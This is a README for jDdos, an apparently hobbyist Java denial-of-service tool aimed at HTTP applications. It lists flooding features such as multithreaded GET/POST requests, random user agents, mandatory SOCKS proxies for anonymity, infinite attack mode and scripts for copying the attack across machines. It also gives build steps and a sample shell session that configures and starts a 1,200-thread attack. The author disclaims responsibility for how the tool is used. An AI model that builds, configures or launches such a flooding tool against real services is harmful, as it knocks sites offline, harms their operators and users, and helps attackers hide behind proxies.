# jddos
Experimental Java based dDos tool
---

jDdos is dDos script that targets HTTP based applications. This script is written in Java and it's only experimental so **I do not take responsiblities for any usages**, you might use it at your own risks.


## Main features

- HTTP GET and POST (only json) support
- Accepts multiple threads
- Configurable headers
- Automatically adds random user agent to headers
- Accepts and forces you to use SOCKS proxy
- Can read list of SOCKS proxy from url
- Configurable number of threads running the attack.
- Distributed different proxies to between requests. Distributed requests between threads.
- Can run infinite attack until told to stop
- Configurable sleep time between request from each service (Default is random)
- Uses **Spring Shell**, therefore its easy to write an attack script and copy it into several machines


## RUN

First build the project

    mvn clean package -DskipTests

Run it

    cd target/
    ./jdDos.java

List commands

    help

Commands:

    add-get-request: Adds get request for attack
    add-header: Adds header
    add-post-request: Adds post request for attack
    add-proxy: Adds proxy - example => 127.0.0.1:9050
    clean: Cleans attack settings
    explain: Explains current config
    read-proxy-list: Reads proxy list from url
    running: Makes infinite running threads, default is false
    set-sleep: Sets exact sleep time between infinte loop of each thread. Default = 0 (Random sleep time)
    start: Runs jdDos attack
    stop: Stops jdDos attack
    threads: Sets threads count

Example:

    shell:>add-proxy 127.0.0.1:9050
    2019-03-29 21:20:00.123  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : done
    
    shell:>add-get-request http://myaddress.com/do.php
    2019-03-29 21:20:53.384  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : done
    
    shell:>add-post-request --address http://myaddress.com/post.php --data {\"name\":\"something\"}
    2019-03-29 21:23:10.567  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : done
    
    shell:>add-header --key Cookie --value "my session"
    2019-03-29 21:23:45.545  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : done
    
    shell:>threads 1200
    2019-03-29 21:25:21.474  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : done
    
    shell:>explain
    Addresses: 
    600 threads will make request to http://myaddress.com/do.php
    600 threads will make request to http://myaddress.com/post.php
    Proxies: 
    127.0.0.1:9050
    Infinite requests: true
    Sleep time is infinite
    Total threads count: 1200
    
    shell:>start
    2019-03-29 21:26:15.858  INFO 9330 --- [main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService
    2019-03-29 21:26:15.858  INFO 9330 --- [main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService
    2019-03-29 21:26:15.930  INFO 9330 --- [main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService
    2019-03-29 21:26:15.930  INFO 9330 --- [main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService
    2019-03-29 21:26:15.980  INFO 9330 --- [main] gh.sep.attacks.jdDos.Commands            : Attack started

To skip writing all commands each time, create a file named `scripts.txt` for example and enter all the commands in right order.
Then start `jdDos` and enter:

    script --file /address/to/scripts.txt

Your attack configuration will load into the application.

